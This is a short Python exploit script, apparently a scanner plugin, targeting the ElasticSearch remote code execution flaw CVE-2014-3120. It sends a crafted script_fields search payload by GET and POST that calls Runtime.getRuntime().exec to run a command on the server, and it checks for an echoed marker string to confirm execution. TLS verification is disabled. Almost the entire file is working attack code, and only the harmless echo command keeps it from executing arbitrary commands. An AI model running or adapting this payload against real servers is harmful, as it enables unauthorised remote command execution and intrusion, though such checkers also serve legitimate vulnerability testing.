import requests
from urllib.parse import urlparse
requests.packages.urllib3.disable_warnings()

name = 'ElasticSearch 远程代码执行漏洞(CVE-2014-3120)'


def run(url):
    headers = {
    'Content-Type':'text/xml',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0',
    }
    host = urlparse(url)
    url = f"{host.scheme}://{host.netloc}"
    try:
        vulurl = url + '''/_search?source=%7b%22size%22%3a1%2c%22query%22%3a%7b%22filtered%22%3a%7b%22query%22%3a%7b%22match_all%22%3a%7b%7d%7d%7d%7d%2c%22script_fields%22%3a%7b%22True%22%3a%7b%22script%22%3a%22import+java.util.*%3b%5cnimport+java.io.*%3b%5cna%3d%5c%221%5c%22%3b%5cnif(a%3d%3d%5c%221%5c%22)%5cnreturn+%5c%22Tre0a498347a5a75a7ue%5c%22%3b%22%7d%7d%7d'''
        response = requests.get(vulurl, headers=headers, timeout=15, verify=False)
        if 'Tre0a498347a5a75a7ue' in response.text and 'echo' not in response.text:
            return ['True',name,vulurl]
        else:
            vulurl = url + '/_search?pretty'
            payload = '''
            {
    "size": 1,
    "query": {
      "filtered": {
        "query": {
          "match_all": {
          }
        }
      }
    },
    "script_fields": {
        "command": {
            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\\"echo Tre0a498347a5a75a7ue\\").getInputStream()).useDelimiter(\\"\\\\\\\\A\\").next();"
        }
    }
}
            '''
            response = requests.post(vulurl, headers=headers, data=payload, timeout=15, verify=False)
            if 'Tre0a498347a5a75a7ue' in response.text and 'echo' not in response.text:
                return ['True',name,vulurl]
            else:
                return ['False',name]
    except Exception as e:
        return ['False',name]

if __name__ == '__main__':
    url = 'http://192.168.123.46:8080/'
    print(run(url))